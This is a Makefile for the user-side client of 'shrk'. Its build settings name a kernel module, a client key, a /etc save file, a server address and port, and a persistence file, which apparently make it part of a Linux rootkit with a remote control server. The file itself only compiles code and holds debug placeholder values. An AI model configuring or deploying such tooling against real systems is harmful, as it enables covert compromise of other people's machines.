# sources
CSRCS = $(shell find ./ -type f -name '*.c')
HSRCS = $(shell find ./inc/ -type f -name '*.h')

# config
SHRK_DEBUG       = 1
SHRK_DEBUG_DUMP  = 0
SHRK_MODULE      = ../kernel/shrk.ko
SHRK_CLIENT_ID   = DEBUGID0
SHRK_SAVE_FILE   = /etc/shrk_save_$(SHRK_CLIENT_ID)
SHRK_CLIENT_KEY  = DEBUGINGKEY0
SHRK_SERVER_ADDR = 127.0.0.1
SHRK_SERVER_PORT = 1053
SHRK_PERSIS_FILE = ""

# compiler args
VARS    = -DSHRK_DEBUG=$(SHRK_DEBUG)                 \
          -DSHRK_DEBUG_DUMP=$(SHRK_DEBUG_DUMP)       \
          -DSHRK_MODULE=\"$(SHRK_MODULE)\"           \
          -DSHRK_CLIENT_ID=\"$(SHRK_CLIENT_ID)\"     \
          -DSHRK_SAVE_FILE=\"$(SHRK_SAVE_FILE)\"     \
          -DSHRK_CLIENT_KEY=\"$(SHRK_CLIENT_KEY)\"   \
          -DSHRK_SERVER_PORT=$(SHRK_SERVER_PORT)     \
          -DSHRK_SERVER_ADDR=\"$(SHRK_SERVER_ADDR)\" \
          -DSHRK_PERSIS_FILE=\"$(SHRK_PERSIS_FILE)\"
CFLAGS  = -O3
INCLUDE =

all: shrk-user.elf

shrk-user.elf: $(CSRCS) $(HSRCS)
	gcc $(CFLAGS) $(INCLUDE) $(VARS) $(CSRCS) -o $@

format:
	clang-format -i -style=file $(CSRCS) $(HSRCS)

clean:
	rm *.elf  

.PHONY: format clean
